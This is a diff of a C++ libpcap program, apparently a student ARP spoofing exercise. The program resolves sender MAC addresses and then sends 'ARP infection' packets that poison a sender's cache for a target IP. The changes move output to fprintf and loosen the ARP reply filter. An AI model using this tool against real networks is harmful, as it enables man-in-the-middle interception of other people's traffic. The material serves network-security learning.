@@ -141,8 +141,8 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	printf("My MAC Address: %s\n", myMacAddress.operator std::string().c_str());
-	printf("My IP Address: %s\n", myIpAddress.operator std::string().c_str());
+	fprintf(stdout, "My MAC Address: %s\n", myMacAddress.operator std::string().c_str());
+	fprintf(stdout, "My IP Address: %s\n", myIpAddress.operator std::string().c_str());
 
 	for (int i = 2; i < argc; i += 2) {
         	Ip senderIp = Ip(argv[i]);
@@ -150,7 +150,7 @@ int main(int argc, char* argv[]) {
 
         	Mac senderMac;
         	if (!sendArpRequest(handle, myMacAddress, myIpAddress, senderIp)) {
-		       	printf("failed to send arp request\n");
+		       	fprintf(stderr, "failed to send arp request\n");
 		}
 
 		struct pcap_pkthdr* header;
@@ -159,19 +159,17 @@ int main(int argc, char* argv[]) {
     			int res = pcap_next_ex(handle, &header, &packet);
     			if (res == 0) continue;
     			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-      				printf("ERROR: pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
+      				fprintf(stderr, "ERROR: pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
       				break;
     			}
 
     			EthHdr* ethHeader = (struct EthHdr*)packet;
-
     			if (ethHeader->type() != EthHdr::Arp) {
       				continue;
     			}
 
     			ArpHdr* arpHeader = (struct ArpHdr*)(packet + sizeof(EthHdr));
-
-    			if (arpHeader->hrd() != ArpHdr::ETHER ||arpHeader->pro() != EthHdr::Ip4 || arpHeader->op() != ArpHdr::Reply) {
+    			if (arpHeader->op() != ArpHdr::Reply) {
       				continue;
     			}
 
@@ -181,12 +179,12 @@ int main(int argc, char* argv[]) {
     			}
   		}
 
-        	printf("Sender IP: %s, Sender MAC: %s\n", senderIp.operator std::string().c_str(), senderMac.operator std::string().c_str());
+        	fprintf(stdout, "Sender IP: %s, Sender MAC: %s\n", senderIp.operator std::string().c_str(), senderMac.operator std::string().c_str());
 
         	if (!sendArpInfection(handle, myMacAddress, senderMac, targetIp, senderIp)) {
             		fprintf(stderr, "failed to send ARP infection to sender(%s)\n", senderIp.operator std::string().c_str());
         	} else {
-            		printf("ARP infection sent to Sender(%s)\n", senderIp.operator std::string().c_str());
+            		fprintf(stdout, "ARP infection sent to Sender(%s)\n", senderIp.operator std::string().c_str());
         	}
     	}
 
